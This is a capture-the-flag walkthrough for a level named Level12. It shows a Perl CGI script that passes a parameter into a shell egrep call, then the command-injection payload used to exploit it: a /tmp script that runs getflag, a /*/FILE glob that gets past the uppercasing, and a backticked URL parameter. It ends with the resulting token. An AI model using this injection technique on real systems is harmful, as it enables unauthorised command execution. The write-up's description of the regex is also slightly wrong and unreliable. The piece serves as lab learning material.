## Level12

We found a perl script:

```
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}
```

Its a script runing on localhost on port 4646 that takes 2 args but we will focus on the first one because it got a potentiel of command injection in this line :

```@output = \`egrep "^$xx" /tmp/xd 2>&1\`;```


But first we need to deal with the 2 regex lines:

```
   $xx =~ tr/a-z/A-Z/;
   $xx =~ s/\s.*//;
```
  
 The first one change the alphabets to uppercase
 The second take string after the  last whitespace
 So we can't inject getflag directly we gonna put the command in a file
 So first we need to create a file in tmp we can call it FILE
 cat /tmp/FILE
 
 ```
    #!/bin/bash
    
    getflag > /tmp/token
  ```
 
 chmod 777 /tmp/file so another user can access it
 we still have one problem its that our output will become like this \`/TMP/FILE/\` and its not a valid path so we will change it to \`/*/FILE/\`
 we go to browser and go to:
 
 ```
 http://192.168.43.125:4646/?x="\`/*/FILE\`"
 ```
 
 comeback to terminal and cat /tmp/token :
 
 ```
 Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
 ```
 
